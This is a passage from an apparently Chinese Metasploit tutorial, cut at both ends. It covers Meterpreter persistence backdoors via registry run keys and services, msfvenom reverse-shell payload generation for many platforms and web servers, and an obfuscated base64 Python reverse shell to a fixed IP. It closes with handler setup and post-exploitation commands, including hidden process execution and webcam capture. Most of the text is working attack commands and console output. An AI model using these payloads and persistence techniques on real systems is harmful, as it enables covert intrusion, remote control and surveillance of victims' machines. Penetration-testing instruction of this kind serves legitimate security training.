class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-3"><a href="#4-8-植入后门-3" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-4"><a href="#2-msf基本命令-4" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-4"><a href="#3-msfvenom生成payload-4" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-4"><a href="#4-Meterpreter基本命令-4" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-4"><a href="#4-1-基本系统命令-4" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span 